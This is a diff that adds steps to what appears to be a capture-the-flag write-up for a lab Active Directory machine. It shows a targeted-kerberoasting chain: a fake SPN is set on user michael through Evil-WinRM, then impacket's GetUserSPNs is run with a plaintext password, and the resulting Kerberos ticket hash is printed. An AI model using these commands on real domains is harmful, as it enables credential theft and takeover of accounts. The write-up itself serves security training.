@@ -575,3 +575,59 @@ Access is denied.
 bloodhound generic write on user michael from user olivia:
 ![image](https://github.com/user-attachments/assets/9fa0fa4a-94ee-4ba1-8475-c58014d74e73)
 
+set SPN for user michael since we have generic write:
+```bash
+
+*Evil-WinRM* PS C:\> Get-ADUser michael
+
+
+DistinguishedName : CN=Michael Williams,CN=Users,DC=administrator,DC=htb
+Enabled           : True
+GivenName         : Michael
+Name              : Michael Williams
+ObjectClass       : user
+ObjectGUID        : 4bf6d1d4-02dc-434c-8dd7-cf73b81063a1
+SamAccountName    : michael
+SID               : S-1-5-21-1088858960-373806567-254189436-1109
+Surname           : Williams
+UserPrincipalName : michael@administrator.htb
+
+
+
+*Evil-WinRM* PS C:\> Set-ADObject -Identity "CN=Michael Williams,CN=Users,DC=administrator,DC=htb" -Add @{servicePrincipalName="fake/service"}
+*Evil-WinRM* PS C:\> Get-ADUser michael -Properties ServicePrincipalName
+
+
+DistinguishedName    : CN=Michael Williams,CN=Users,DC=administrator,DC=htb
+Enabled              : True
+GivenName            : Michael
+Name                 : Michael Williams
+ObjectClass          : user
+ObjectGUID           : 4bf6d1d4-02dc-434c-8dd7-cf73b81063a1
+SamAccountName       : michael
+ServicePrincipalName : {fake/service}
+SID                  : S-1-5-21-1088858960-373806567-254189436-1109
+Surname              : Williams
+UserPrincipalName    : michael@administrator.htb
+```
+
+kerberoast user michael since he now has SPN:
+```bash
+└──╼ [★]$ impacket-GetUserSPNs administrator.htb/olivia:ichliebedich -request -dc-ip 10.129.96.179
+Impacket v0.13.0.dev0+20240916.171021.65b774d - Copyright Fortra, LLC and its affiliated companies 
+
+ServicePrincipalName  Name     MemberOf                                                       PasswordLastSet             LastLogon  Delegation 
+--------------------  -------  -------------------------------------------------------------  --------------------------  ---------  ----------
+fake/service          michael  CN=Remote Management Users,CN=Builtin,DC=administrator,DC=htb  2024-10-05 20:33:37.049043  <never>               
+
+
+
+[-] CCache file is not found. Skipping...
+$krb5tgs$23$*michael$ADMINISTRATOR.HTB$administrator.htb/michael*$add1e69039bd27cd6eebd8f8530f3fae$3f2cab225a667da44ffa6aaa743b4b4e01cab77a4760914cac83cba8101799da25426d497c57779dbb23f7eff3c862ed139f54bddf8195b27e663380043cd18246bd256c115734b53939ad00fc104631b306c84fac6c9e0241804b469b7c11afe7d4013765b39a67b4b877406a7b154014ade2a5dadb2b6500ea225e9d0a52e3507deb02dd63fa11568e252d0a397b7c8853d2f7a9ba7ee6f377d91616108a64ab221fd0adc89612bf6b6a387cbf2d22d0b30740fcbdbcdb3d8afbf120e8fed6d76cfc21ba19d0e62a155a25512393cd68941e297bc64d3251b3e4b109c6dfd2e981c72b5723cb5412fa278e8aef179f045dd88154e275923aaf908c941ec9a3dd68fc9fbac6a82a865a1ef798c9b6e99fcba4b10d0339e2d9d44ef2926fbbfa43e6bc8ff3b3b0024ecff5a35065326e85390e2faa06e7e7c916cf15bed0e34a3ec5173a07b7b2bdbc210cfea31ff33d3405553df8e9e3520aa2d2a5e94cf629ecdd5bd542b6e0637145b76845557770755b7c832b39d61462059adde75f0d1e4293d68b2fa230c63dec2846af77463022eed95ef3ecb1aeadea2171312a5b57aacd237f03f752fe0471ea00a6107d57def0fdfdf2115166c17fbf04bb1ef00bfb738b053c373cd02a935528ac58106373c6aaacba2e1c6d3921e6911684c959c3999afb12f05c46a212ced74d1a92a10a0460b6835e9ebdb3ca00319925ee6f5ce75924cdde951ea23078c906603df2543a25763918e855d2913a8bab0b52c4a873b1325239174e8c4dc243ed9f6ae8c6f91d9a1888acc45d5cf2d9fd3112c6d54ffad089bc3426f46d286d5a73c1fa8882e6a1f0b21476dd0102078836ec4f32cb1303d972bbd139327ee96f43199b82b99bc1942773922eaa78f4b9c9c5d63774f5b55b1961ddefc320427323b3c6cb6e502278d1e7f3bfd04700e46fde675b0f72accd29cbb56463875986eea28b1c3015fa3d0368d162cb04e1ed6682cf426f20cd3802a2dabe92ba26402292ed1306cce1a2ce531bd1abf43524dec7263a2dce343ea24ac7bb622000f79ee7e717e4a7bbecde66b16cbb57d8939aec2c2c63c24efc3d65f302ac7358a7fee321adcc5b0ab96e03dd35b8a1b01d0b798ad173ed89c25ea6e636f2c7c149960efc43044b26d042883f780165f146acb69fe46e3e39f1b5861a68de935f1d45e840122cdc9fa2cdcb7500cf7c5250f3a895534e3411bcaaa66e2cd34a637aac285f12579df760be9ed894f122e4159be3e830ff602a9a6f8e851e036d427e62aaee65ebd562f48c0ec24b5d820a700fa8e568e6479b035d2d565e86b04f92e09813daab0945dd6e5b843a3f01629a8aca117019e498eb3aa9138d1d4fc558b3cff8a3c4226324f2c8ad9076cc27537e671b4e800368c7e5fabbb05f9f7bf9a5e3a916b64204d9fc46898d64fdcae5b8b66e517f2bd998af0cd335b2a76c42627fee3ab5b22e99ddedb6bef108b318d6defa3a6c7f38ebf2d99bc7d157490b9756630b96181a0330cdd1
+```
+
+hashcat output for user michael:
+```bash
+
+```
+
